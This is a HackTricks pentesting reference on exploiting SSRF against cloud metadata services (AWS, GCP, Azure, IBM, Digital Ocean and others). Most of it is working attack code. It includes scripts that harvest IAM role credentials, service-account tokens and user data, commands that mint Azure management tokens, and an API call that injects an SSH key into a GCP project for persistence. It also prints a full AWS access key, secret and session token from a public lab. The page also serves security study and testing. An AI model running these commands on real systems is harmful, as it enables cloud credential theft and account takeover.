# Cloud SSRF

<details>

<summary><a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ HackTricks LIVE Twitch</strong></a> <strong>Wednesdays 5.30pm (UTC) 🎙️ -</strong> <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## AWS

### Abusing SSRF in AWS EC2 environment

**The metadata** endpoint can be accessed from inside any EC2 machine and offers interesting information about it. It's accesible in the url: `http://169.254.169.254` ([information about the metadata here](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html)).

There are **2 versions** of the metadata endpoint. The **first** one allows to **access** the endpoint via **GET** requests (so any **SSRF can exploit it**). For the **version 2**, [IMDSv2](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html), you need to ask for a **token** sending a **PUT** request with a **HTTP header** and then use that token to access the metadata with another HTTP header (so it's **more complicated to abuse** with a SSRF).

In the **version 2** the **TTL by default is 1.** This ensures that misconfigured network appliances (firewalls, NAT devices, routers, etc.) will not forward the packet on. This also means that **Docker containers** using the default networking configuration (bridge mode) **will not be able to reach** the instance metadata service.\
**IMDSv2** will also **block requests to fetch a token that include the `X-Forwarded-For` header**. This is to prevent misconfigured reverse proxies from being able to access it.

You can find information about the [metadata endpoints in the docs](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-categories.html). In the following script some interesting information is obtained from it:

```bash
EC2_TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>/dev/null || wget -q -O - --method PUT "http://169.254.169.254/latest/api/token" --header "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>/dev/null)
HEADER="X-aws-ec2-metadata-token: $EC2_TOKEN"
URL="http://169.254.169.254/latest/meta-data"

aws_req=""
if [ "$(command -v curl)" ]; then
    aws_req="curl -s -f -H '$HEADER'"
elif [ "$(command -v wget)" ]; then
    aws_req="wget -q -O - -H '$HEADER'"
else 
    echo "Neither curl nor wget were found, I can't enumerate the metadata service :("
fi

printf "ami-id: "; eval $aws_req "$URL/ami-id"; echo ""
printf "instance-action: "; eval $aws_req "$URL/instance-action"; echo ""
printf "instance-id: "; eval $aws_req "$URL/instance-id"; echo ""
printf "instance-life-cycle: "; eval $aws_req "$URL/instance-life-cycle"; echo ""
printf "instance-type: "; eval $aws_req "$URL/instance-type"; echo ""
printf "region: "; eval $aws_req "$URL/placement/region"; echo ""

echo ""
echo "Account Info"
eval $aws_req "$URL/identity-credentials/ec2/info"; echo ""
eval $aws_req "http://169.254.169.254/latest/dynamic/instance-identity/document"; echo ""

echo ""
echo "Network Info"
for mac in $(eval $aws_req "$URL/network/interfaces/macs/" 2>/dev/null); do 
  echo "Mac: $mac"
  printf "Owner ID: "; eval $aws_req "$URL/network/interfaces/macs/$mac/owner-id"; echo ""
  printf "Public Hostname: "; eval $aws_req "$URL/network/interfaces/macs/$mac/public-hostname"; echo ""
  printf "Security Groups: "; eval $aws_req "$URL/network/interfaces/macs/$mac/security-groups"; echo ""
  echo "Private IPv4s:"; eval $aws_req "$URL/network/interfaces/macs/$mac/ipv4-associations/"; echo ""
  printf "Subnet IPv4: "; eval $aws_req "$URL/network/interfaces/macs/$mac/subnet-ipv4-cidr-block"; echo ""
  echo "PrivateIPv6s:"; eval $aws_req "$URL/network/interfaces/macs/$mac/ipv6s"; echo ""
  printf "Subnet IPv6: "; eval $aws_req "$URL/network/interfaces/macs/$mac/subnet-ipv6-cidr-blocks"; echo ""
  echo "Public IPv4s:"; eval $aws_req "$URL/network/interfaces/macs/$mac/public-ipv4s"; echo ""
  echo ""
done

echo ""
echo "IAM Role"
eval $aws_req "$URL/iam/info"
for role in $(eval $aws_req "$URL/iam/security-credentials/" 2>/dev/null); do 
  echo "Role: $role"
  eval $aws_req "$URL/iam/security-credentials/$role"; echo ""
  echo ""
done

echo ""
echo "User Data"
# Search hardcoded credentials
eval $aws_req "http://169.254.169.254/latest/user-data"

echo ""
echo "EC2 Security Credentials"
eval $aws_req "$URL/identity-credentials/ec2/security-credentials/ec2-instance"; echo ""
```

As a **publicly available IAM credentials** exposed example you can visit: [http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws](http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws)

You can also check public **EC2 security credentials** in: [http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance](http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance)

You can then take **those credentials and use them with the AWS CLI**. This will allow you to do **anything that role has permissions** to do.

To take advantage of the new credentials, you will need to crate a new AWS profile like this one:

```
[profilename]
aws_access_key_id = ASIA6GG7PSQG4TCGYYOU
aws_secret_access_key = a5kssI2I4H/atUZOwBr5Vpggd9CxiT5pUkyPJsjC
aws_session_token = AgoJb3JpZ2luX2VjEGcaCXVzLXdlc3QtMiJHMEUCIHgCnKJl8fwc+0iaa6n4FsgtWaIikf5mSSoMIWsUGMb1AiEAlOiY0zQ31XapsIjJwgEXhBIW3u/XOfZJTrvdNe4rbFwq2gMIYBAAGgw5NzU0MjYyNjIwMjkiDCvj4qbZSIiiBUtrIiq3A8IfXmTcebRDxJ9BGjNwLbOYDlbQYXBIegzliUez3P/fQxD3qDr+SNFg9w6WkgmDZtjei6YzOc/a9TWgIzCPQAWkn6BlXufS+zm4aVtcgvBKyu4F432AuT4Wuq7zrRc+42m3Z9InIM0BuJtzLkzzbBPfZAz81eSXumPdid6G/4v+o/VxI3OrayZVT2+fB34cKujEOnBwgEd6xUGUcFWb52+jlIbs8RzVIK/xHVoZvYpY6KlmLOakx/mOyz1tb0Z204NZPJ7rj9mHk+cX/G0BnYGIf8ZA2pyBdQyVbb1EzV0U+IPlI+nkIgYCrwTCXUOYbm66lj90frIYG0x2qI7HtaKKbRM5pcGkiYkUAUvA3LpUW6LVn365h0uIbYbVJqSAtjxUN9o0hbQD/W9Y6ZM0WoLSQhYt4jzZiWi00owZJjKHbBaQV6RFwn5mCD+OybS8Y1dn2lqqJgY2U78sONvhfewiohPNouW9IQ7nPln3G/dkucQARa/eM/AC1zxLu5nt7QY8R2x9FzmKYGLh6sBoNO1HXGzSQlDdQE17clcP+hrP/m49MW3nq/A7WHIczuzpn4zv3KICLPIw2uSc7QU6tAEln14bV0oHtHxqC6LBnfhx8yaD9C71j8XbDrfXOEwdOy2hdK0M/AJ3CVe/mtxf96Z6UpqVLPrsLrb1TYTEWCH7yleN0i9koRQDRnjntvRuLmH2ERWLtJFgRU2MWqDNCf2QHWn+j9tYNKQVVwHs3i8paEPyB45MLdFKJg6Ir+Xzl2ojb6qLGirjw8gPufeCM19VbpeLPliYeKsrkrnXWO0o9aImv8cvIzQ8aS1ihqOtkedkAsw=
```

Notice the **aws\_session\_token**, this is indispensable for the profile to work.

[**PACU**](https://github.com/RhinoSecurityLabs/pacu) can be used with the discovered credentials to find out your privileges and try to escalate privileges

### SSRF in AWS ECS (Container Service) credentials

**ECS**, is a logical group of EC2 instances on which you can run an application without having to scale your own cluster management infrastructure because ECS manages that for you. If you manage to compromise service running in **ECS**, the **metadata endpoints change**.

If you access _**http://169.254.170.2/v2/credentials/\<GUID>**_ you will find the credentials of the ECS machine. But first you need to **find the \<GUID>**. To find the \<GUID> you need to read the **environ** variable **AWS\_CONTAINER\_CREDENTIALS\_RELATIVE\_URI** inside the machine.\
You could be able to read it exploiting an **Path Traversal** to `file:///proc/self/environ`\
The mentioned http address should give you the **AccessKey, SecretKey and token**.

```bash
curl "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI" 2>/dev/null || wget "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI" -O -
```

{% hint style="info" %}
Note that in **some cases** you will be able to access the **EC2 metadata instance** from the container (check IMDSv2 TTL limitations mentioned previously). In these scenarios from the container you could access both the container IAM role and the EC2 IAM role.
{% endhint %}

### SSRF for AWS Lambda <a href="#6f97" id="6f97"></a>

In this case the **credentials are stored in env variables**. So, to access them you need to access something like **`file:///proc/self/environ`**.

The **name** of the **interesting env variables** are:

* `AWS_SESSION_TOKEN`
* `AWS_SECRET_ACCESS_KEY`
* `AWS_ACCES_KEY_ID`

Moreover, in addition to IAM credentials, Lambda functions also have **event data that is passed to the function when it is started**. This data is made available to the function via the [runtime interface](https://docs.aws.amazon.com/lambda/latest/dg/runtimes-api.html) and could contain **sensitive** **information** (like inside the **stageVariables**). Unlike IAM credentials, this data is accessible over standard SSRF at **`http://localhost:9001/2018-06-01/runtime/invocation/next`**.

{% hint style="warning" %}
Note that **lambda credentials** are inside the **env variables**. So if the **stack trace** of the lambda code prints env vars, it's possible to **exfiltrate them provoking an error** in the app.
{% endhint %}

### SSRF URL for AWS Elastic Beanstalk <a href="#6f97" id="6f97"></a>

We retrieve the `accountId` and `region` from the API.

```
http://169.254.169.254/latest/dynamic/instance-identity/document
http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
```

We then retrieve the `AccessKeyId`, `SecretAccessKey`, and `Token` from the API.

```
http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
```

![](https://miro.medium.com/max/60/0\*4OG-tRUNhpBK96cL?q=20) ![](https://miro.medium.com/max/1469/0\*4OG-tRUNhpBK96cL)

Then we use the credentials with `aws s3 ls s3://elasticbeanstalk-us-east-2-[ACCOUNT_ID]/`.

## GCP <a href="#6440" id="6440"></a>

You can [**find here the docs about metadata endpoints**](https://cloud.google.com/appengine/docs/standard/java/accessing-instance-metadata).

### SSRF URL for Google Cloud <a href="#6440" id="6440"></a>

Requires the header "Metadata-Flavor: Google" or "X-Google-Metadata-Request: True" and you can access the metadata endpoint in with the following URLs:

* http://169.254.169.254
* http://metadata.google.internal
* http://metadata

Interesting endpoints to extract information:

```bash
# /project
# Project name and number
curl -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/project/project-id
curl -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/project/numeric-project-id
# Project attributes
curl -H "X-Google-Metadata-Request: True" http://metadata/computeMetadata/v1/project/attributes/?recursive=true

# /oslogin
# users
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/oslogin/users
# groups
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/oslogin/groups
# security-keys
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/oslogin/security-keys
# authorize
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/oslogin/authorize

# /instance
# Description
curl -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/instance/description
# Hostname
curl -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/instance/hostname
# ID
curl -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/instance/id
# Image
curl -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/instance/image
# Machine Type
curl -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/machine-type
# Name
curl -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/name
# Tags
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/scheduling/tags
# Zone
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/zone
# User data
curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/attributes/startup-script"
# Network Interfaces
for iface in $(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/network-interfaces/"); do 
    echo "  IP: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/network-interfaces/$iface/ip")
    echo "  Subnetmask: "$(curl -s -f -H "X-Google-Metadata-Request: True" "http://metadata/computeMetadata/v1/instance/network-interfaces/$iface/subnetmask")
    echo "  Gateway: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/network-interfaces/$iface/gateway")
    echo "  DNS: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/network-interfaces/$iface/dns-servers")
    echo "  Network: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/network-interfaces/$iface/network")
    echo "  ==============  "
done
# Service Accounts
for sa in $(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/"); do 
    echo "  Name: $sa"
    echo "  Email: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/$sa/email")
    echo "  Aliases: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/$sa/aliases")
    echo "  Identity: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/$sa/identity")
    echo "  Scopes: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/$sa/scopes")
    echo "  Token: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/$sa/token")
    echo "  ==============  "
done
# K8s Attributtes
## Cluster location
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/cluster-location
## Cluster name
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/cluster-name
## Os-login enabled
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/enable-oslogin
## Kube-env
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/kube-env
## Kube-labels
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/kube-labels
## Kubeconfig
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/kubeconfig

# All custom project attributes
curl "http://metadata.google.internal/computeMetadata/v1/project/attributes/?recursive=true&alt=text" \
    -H "Metadata-Flavor: Google"

# All custom project attributes instance attributes
curl "http://metadata.google.internal/computeMetadata/v1/instance/attributes/?recursive=true&alt=text" \
    -H "Metadata-Flavor: Google"
```

Beta does NOT require a header atm (thanks Mathias Karlsson @avlidienbrunn)

```
http://metadata.google.internal/computeMetadata/v1beta1/
http://metadata.google.internal/computeMetadata/v1beta1/?recursive=true
```

{% hint style="danger" %}
In order to **use the exfiltrated service account token** you can just do:

```bash
# Via env vars
export CLOUDSDK_AUTH_ACCESS_TOKEN=<token>
gcloud projects list

# Via setup
echo "<token>" > /some/path/to/token
gcloud config set auth/access_token_file /some/path/to/token
gcloud projects list
gcloud config unset auth/access_token_file
```
{% endhint %}

### Add an SSH key <a href="#3e24" id="3e24"></a>

Extract the token

```
http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token?alt=json
```

Check the scope of the token

```
$ curl https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=ya29.XXXXXKuXXXXXXXkGT0rJSA  { 
        "issued_to": "101302079XXXXX", 
        "audience": "10130207XXXXX", 
        "scope": "https://www.googleapis.com/auth/compute https://www.googleapis.com/auth/logging.write https://www.googleapis.com/auth/devstorage.read_write https://www.googleapis.com/auth/monitoring", 
        "expires_in": 2443, 
        "access_type": "offline" 
}
```

Now push the SSH key.

```bash
curl -X POST "https://www.googleapis.com/compute/v1/projects/1042377752888/setCommonInstanceMetadata" 
-H "Authorization: Bearer ya29.c.EmKeBq9XI09_1HK1XXXXXXXXT0rJSA" 
-H "Content-Type: application/json" 
--data '{"items": [{"key": "sshkeyname", "value": "sshkeyvalue"}]}'
```

## Digital Ocean <a href="#9f1f" id="9f1f"></a>

{% hint style="warning" %}
There isn't things like AWS Roles or GCP service account, so don't expect to find metadata bot credentials
{% endhint %}

Documentation available at [`https://developers.digitalocean.com/documentation/metadata/`](https://developers.digitalocean.com/documentation/metadata/)

```
curl http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1.json
http://169.254.169.254/metadata/v1/ 
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/user-data
http://169.254.169.254/metadata/v1/hostname
http://169.254.169.254/metadata/v1/region
http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/addressAll in one request:
curl http://169.254.169.254/metadata/v1.json | jq
```

## Azure <a href="#cea8" id="cea8"></a>

### Azure VM

[**Docs** in here](https://learn.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service?tabs=linux).

* **Must** contain the header `Metadata: true`
* Must **not** contain an `X-Forwarded-For` header

```powershell
# Powershell
Invoke-RestMethod -Headers @{"Metadata"="true"} -Method GET -NoProxy -Uri "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | ConvertTo-Json -Depth 64
## User data
$userData = Invoke- RestMethod -Headers @{"Metadata"="true"} -Method GET -Uri "http://169.254.169.254/metadata/instance/compute/userData?api-version=2021- 01-01&format=text"
[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($userData))
# Linux
curl -s -H Metadata:true --noproxy "*" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | jq

# Paths
/metadata/instance?api-version=2017-04-02
/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text
/metadata/instance/compute/userData?api-version=2021-01-01&format=text
```

### Azure App Service

From the **env** you can get the values of `IDENTITY_HEADER` _and_ `IDENTITY_ENDPOINT`. That you can use to gather a token to speak with the metadata server.

Most of the time, you want a token for one of these resources:

* [https://storage.azure.com](https://storage.azure.com/)
* [https://vault.azure.net](https://vault.azure.net/)
* [https://graph.microsoft.com](https://graph.microsoft.com/)
* [https://management.azure.com](https://management.azure.com/)

```bash
# Check for those env vars to know if you are in an Azure app
echo $IDENTITY_HEADER
echo $IDENTITY_ENDPOINT

# You should also be able to find the folder:
ls /opt/microsoft
#and the file
ls /opt/microsoft/msodbcsql17

# Get management token
curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
# Get graph token
curl "$IDENTITY_ENDPOINT?resource=https://graph.azure.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER

# API
# Get Subscriptions
URL="https://management.azure.com/subscriptions?api-version=2020-01-01"
curl -H "Authorization: $TOKEN" "$URL"
# Get current permission on resources in the subscription
URL="https://management.azure.com/subscriptions/<subscription-uid>/resources?api-version=2020-10-01'"
curl -H "Authorization: $TOKEN" "$URL"
# Get permissions in a VM
URL="https://management.azure.com/subscriptions/<subscription-uid>/resourceGroups/Engineering/providers/Microsoft.Compute/virtualMachines/<VM-name>/providers/Microsoft.Authorization/permissions?api-version=2015-07-01"
curl -H "Authorization: $TOKEN" "$URL"
```

```powershell
# API request in powershell to management endpoint
$Token = 'eyJ0eX..'
$URI='https://management.azure.com/subscriptions?api-version=2020-01-01'
$RequestParams = @{
 Method = 'GET'
 Uri = $URI
 Headers = @{
  'Authorization' = "Bearer $Token"
 }
}
(Invoke-RestMethod @RequestParams).value

# API request to graph endpoint (get enterprise applications)
$Token = 'eyJ0eX..'
$URI = 'https://graph.microsoft.com/v1.0/applications'
$RequestParams = @{
 Method = 'GET'
 Uri = $URI
 Headers = @{
 'Authorization' = "Bearer $Token"
 }
}
(Invoke-RestMethod @RequestParams).value

# Using AzureAD Powershell module witho both management and graph tokens
$token = 'eyJ0e..'
$graphaccesstoken = 'eyJ0eX..'
Connect-AzAccount -AccessToken $token -GraphAccessToken $graphaccesstoken -AccountId 2e91a4f12984-46ee-2736-e32ff2039abc

# Try to get current perms over resources
Get-AzResource
## The following error means that the user doesn't have permissions over any resource
Get-AzResource : 'this.Client.SubscriptionId' cannot be null.
At line:1 char:1
+ Get-AzResource
+ ~~~~~~~~~~~~~~
 + CategoryInfo : CloseError: (:) [Get-AzResource],ValidationException
 + FullyQualifiedErrorId :
Microsoft.Azure.Commands.ResourceManager.Cmdlets.Implementation.GetAzureResourceCmdlet
```

## IBM Cloud <a href="#2af0" id="2af0"></a>

{% hint style="warning" %}
Note that in IBM by default metadata is not enabled, so it's possible that you won't be able to access it even if you are inside an IBM cloud VM
{% endhint %}

{% code overflow="wrap" %}
```bash
export instance_identity_token=`curl -s -X PUT "http://169.254.169.254/instance_identity/v1/token?version=2022-03-01"\
  -H "Metadata-Flavor: ibm"\
  -H "Accept: application/json"\
  -d '{
        "expires_in": 3600
      }' | jq -r '(.access_token)'`

# Get instance details
curl -s -H "Accept: application/json" -H "Authorization: Bearer $instance_identity_token" -X GET "http://169.254.169.254/metadata/v1/instance?version=2022-03-01" | jq

# Get SSH keys info
curl -s -X GET -H "Accept: application/json" -H "Authorization: Bearer $instance_identity_token" "http://169.254.169.254/metadata/v1/keys?version=2022-03-01" | jq

# Get SSH keys fingerprints & user data
curl -s -X GET -H "Accept: application/json" -H "Authorization: Bearer $instance_identity_token" "http://169.254.169.254/metadata/v1/instance/initialization?version=2022-03-01" | jq

# Get placement groups
curl -s -X GET -H "Accept: application/json" -H "Authorization: Bearer $instance_identity_token" "http://169.254.169.254/metadata/v1/placement_groups?version=2022-03-01" | jq

# Get IAM credentials
curl -s -X POST -H "Accept: application/json" -H "Authorization: Bearer $instance_identity_token" "http://169.254.169.254/instance_identity/v1/iam_token?version=2022-03-01" | jq
```
{% endcode %}

## Packetcloud <a href="#2af0" id="2af0"></a>

Documentation available at [`https://metadata.packet.net/userdata`](https://metadata.packet.net/userdata)

## OpenStack/RackSpace <a href="#2ffc" id="2ffc"></a>

(header required? unknown)

```
http://169.254.169.254/openstack
```

## HP Helion <a href="#a8e0" id="a8e0"></a>

(header required? unknown)

```
http://169.254.169.254/2009-04-04/meta-data/
```

## Oracle Cloud <a href="#a723" id="a723"></a>

```
http://192.0.0.192/latest/
http://192.0.0.192/latest/user-data/
http://192.0.0.192/latest/meta-data/
http://192.0.0.192/latest/attributes/
```

## Alibaba <a href="#51bd" id="51bd"></a>

```
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/instance-id
http://100.100.100.200/latest/meta-data/image-id
```

## Kubernetes ETCD <a href="#c80a" id="c80a"></a>

Can contain API keys and internal ip and ports

```
curl -L http://127.0.0.1:2379/version
curl http://127.0.0.1:2379/v2/keys/?recursive=true
```

## Docker <a href="#ac0b" id="ac0b"></a>

```
http://127.0.0.1:2375/v1.24/containers/jsonSimple example
docker run -ti -v /var/run/docker.sock:/var/run/docker.sock bash
bash-4.4# curl --unix-socket /var/run/docker.sock http://foo/containers/json
bash-4.4# curl --unix-socket /var/run/docker.sock http://foo/images/json
```

## Rancher <a href="#8cb7" id="8cb7"></a>

```
curl http://rancher-metadata/<version>/<path>
```

<details>

<summary><a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ HackTricks LIVE Twitch</strong></a> <strong>Wednesdays 5.30pm (UTC) 🎙️ -</strong> <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
